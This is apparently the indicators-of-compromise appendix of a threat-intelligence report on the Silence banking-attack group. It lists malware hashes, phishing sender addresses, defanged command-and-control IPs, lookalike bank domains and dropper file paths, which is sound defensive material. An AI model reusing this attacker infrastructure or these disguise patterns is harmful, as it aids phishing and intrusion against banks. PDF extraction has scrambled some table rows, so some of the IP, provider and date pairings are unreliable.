Silence.Downloader\nb4313151019b2091cbd27c8810e5c7c5 — Silence.Downloader\nc6c84da4f27103db4ff593f4d4f45d95 — Silence.Downloader\nef0fb10c602e3ee81e3677c83a44b409 — Silence.Downloader\n8a9d278b473b6c5625d57739714702fc — Silence.Cleaner\na3de4a1e5b66d96183ad42800d6be862 — Silence.MainModule\nb43f65492f2f374c86998bd8ed39bfdd — Silence.MainModule\nc4f18d40b17e506f42f72b8ff111a614 — Silence.MainModule\ncfffc5a0e5bdc87ab11b75ec8a6715a4 — Silence.MainModule\nf1954b7034582da44d3f6a160f0a9322 — Silence.MainModule\n121c7a3f139b1cc3d0bf62d951bbe5cb — Silence.ProxyBot\n88cb1babb591381054001a7a588f7a28 — Silence.ProxyBot\na6771cafd7114df25ac0ef2688722fdf — Silence.ProxyBot\na6cb04fad56f1fe5b8f60fabf2f64005 — Silence.ProxyBot\ndc4ac53350cc4b30839db19d8d6f3b5f — Silence.ProxyBot\n50565c4b80f41d2e7eb989cd24082aab — Silence.ProxyBot.Net\n8191dae4bdeda349bda38fd5791cb66f — Silence.ProxyBot.Net\n242b471bae5ef9b4de8019781e553b85 — Silence.SurviellanceModule\nd7491ed06a7f19a2983774fd50d65fb2 — Silence.SurviellanceModule\n1648437368e662fbe4805a1f95aa9fd0 — Smoke\ndde658eb388512ee9f4f31f0f027a7df — CHM\nE-mails\nSenders:\ninfo@finamnews019[.]xyz\ndriley123@bellsouth[.]net\nbelov@ppfbank[.]ru\nbelov@vivacity[.]ru\ncap@jabber[.]sg\ncjlove143@ymail[.]com\ndriley123@bellsouth[.]net\niambrunk@sbcglobal[.]net\njosueruvalcaba@mail[.]com\npakovelli@mail[.]com\npayonline@fbank[.]org\nprokopenkovg@bankci[.]ru\nrevamped702@att[.]net83\nsleof@fpbank[.]ru\nsvetlana@fcbank[.]ru\ntouqirkhan@mail[.]com\nyu_chernyshova@mail[.]com\nIPs\nIP Provider Country Program Year\n46.183.221[.]89 DataClub S.A. Latvia Silence.ProxyBot 2016-07\nKikothac\n87.98.227[.]83 OVH Spain Silence.ProxyBot 2016-08\n5.39.30[.]110 OVH France Silence.Downloader 2016-09\n46.183.221[.]37 DataClub S.A. Latvia Silence 2016-11\n54.36.191[.]97 OVH France Silence.Downloader 2017-10\n139.99.156[.]100 OVH France Exploit 2017-10\n185.161.208[.]61 DeltaHost Ukraine Silence.ProxyBot 2017-07\n2018-02Silence\nSilence.ProxyBot.\nNET\n185.20.184[.]29 DeltaHost Ukraine Silence 2017-07\nMeterpreter  \nsecure2048[.]at\n137.74.224[.]142 OVH France Silence.Downloader 2017-08\n149.56.131[.]140 OVH France Meterpreter 2017-08  \n2017-10\n158.69.218[.]119 OVH Canada Silence.Downloader 2017-08\n5.188.231[.]89 MoreneHost\nSinaro.host  The \nNetherlands Unknown 2017-10\n185.29.10[.]117 DataClub S.A. Sweden Silence.ProxyBot 2017-09\nSilence.DownloaderSilence\nMoving into the darkside84\n91.207.7[.]86 MaxiDed Poland Silence.Downloader 2018-04\n91.207.7[.]79 MaxiDed Poland Silence.Downloader 2018-04\nJS downloader 2017-10\n5.154.191[.]105 Stephost Moldavia exploit 2018-04\n144.217.14[.]173 OVH Canada Exploit CVE-2017-\n01992017-04\n144.217.162[.]168 OVH Canada Silence.Downloader 2017-06\n164.132.228[.]29 OVH France Silence.Downloader 2017-06\n185.29.11[.]126 DataClub S.A. The \nNetherlands Kikothac 2017-12\n193.169.245[.]89 DeltaHost The \nNetherlands Kikothac 2016-08\n51.255.200[.]161 OVH France Exploit CVE-2017-\n01992017-06\n91.243.80[.]200 MoreneHost The \nNetherlandsExploit CVE-2017-\n11882 + CVE-2018-\n08022018-05\n92.222.68[.]32 OVH France Silence.Downloader 2017-04\nUndernet DDoS bot 2017-09\n5.8.88[.]254 MoreneHost The \nNetherlands Silence.Downloader 2018-05\n109.13.212[.]72 SFR SA France pakovelli@mail[.]\ncom 2017-08\n194.58.97[.]95 Reg.Ru Russia hacked \nfinamnews019[.]xyz2017-10\n46.170.125[.]222 Poland yu_chernyshova@\nmail[.]com2017-08\n62.57.131[.]114 Spain touqirkhan@mail[.]\ncom2017-08\n77.246.145[.]202 E-PLANET Russia hacked vivacity[.]ru 2017-08\n91.207.7[.]97 Poland LNK downloader 2017-06\nJS downloader 2017-10\nira.pubcs16[.]ro\n91.134.146[.]175   OVH Ireland Undernet DDoS bot 2017-0985\nIP Real bank Provider Country Date\n5.200.55[.]198  bankrab[.]ru OOO IT-Grad Russia 07-2016\n185.7.30[.]137 itbank[.]ru VMLAB LLC VPS \nCustomersRussia 06-2017\nDomains\nDomain Date\ntvaudio[.]ru 07-2016\nvivacity[.]ru 08-2017\nfinamnews019[.]xyz 10-2017\nDomain IP Provider Country Date\ntrustintbank[.]org 109.234.34[.]35  VDSINA VDS \nHostingRussia 2016-07\nitbank[.]us 193.0.178[.]12  PE Viktor Tyurin The \nNetherlands 2016-07\nitrbank[.]ru 31.31.204[.]161 Reg.Ru Russia 2016-09\nitmbank[.]ru 185.100.67[.]129  Hoster.KZ Kazakhstan 2016-09\nitmbank[.]us 46.30.43[.]83  Eurobyte VPS Russia 2016-09\nmosfinbank[.]ru 5.200.56[.]161  OOO IT-Grad 2016-09\nmostbbank[.]ru 31.31.204[.]161 Reg.Ru Russia 2016-09\n77.246.145[.]86 E-PLANET Russia 2017-06\n77.246.145[.]82 2017-06\nppfbank[.]ru 185.158.154[.]147  IT-GRAD 1Cloud \nLLCRussia 2017-06\nfbank[.]org 185.158.154[.]17  IT-GRAD 1Cloud \nLLCRussia 2017-06\n185.154.53[.]132  2017-06\ndgbank[.]ru 158.255.0[.]35 Mir Telematiki \nLtdRussia 2017-09\nbankci[.]ru 95.142.39[.]5 Eurobyte VDS Russia 2017-09\n95.142.39[.]6 Eurobyte VDS Russia 2017-09\ncsbank[.]ru 185.180.231[.]63 FirstByte Russia 2017-09Silence\nMoving into the darkside86\nfcbank[.]ru 195.161.41[.]2  Avguro \nTechnologies \nLtd. Hosting \nservice providerRussia 2017-09\n81.177.135[.]99   2017-10\nmmibank[.]ru 81.177.140[.]58 Avguro \nTechnologies \nLtd. Hosting \nservice providerRussia 2017-09\n81.177.6[.]226 2017-10\nspas-\nibosberbank[.]ru185.235.130[.]69  ON-LINE DATA \nLTDThe \nNetherlands2018-01\nfpbank[.]ru 217.28.213[.]250 INTRELL-NE T Russia 2018-05\n217.28.213[.]162  2018-05\n217.29.57[.]176  2018-05\nDomain IP Program Year \nvariiform[.]gdn 91.207.7[.]97 Smoke 2017-10\ncassocial[.]gdn\nsecure2048[.]at 185.20.184[.]29 Meterpreter 2017-07\nFile system artifacts\nDirectories\n• c:\\1\n• c:\\intel\n• c:\\atm\nFiles:\n• C:\\Users\\<%username%>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\\nPrograms\\Startup\\WINWORD.exe \n• C:\\ProgramData\\IntelSofts_<hex value>.exe\n• C:\\ProgramData\\MicrosoftsUpdte.exe\n• C:/Windows/temp/OBDP952.tmp.exe\n• apcs.exe\n• netsrvc32.exe\n• smmsrv.exe\n• MicrosoftsUpdte_<hex value>.exe\n• Intel Security.exe \n• pripr.exe93\n"
}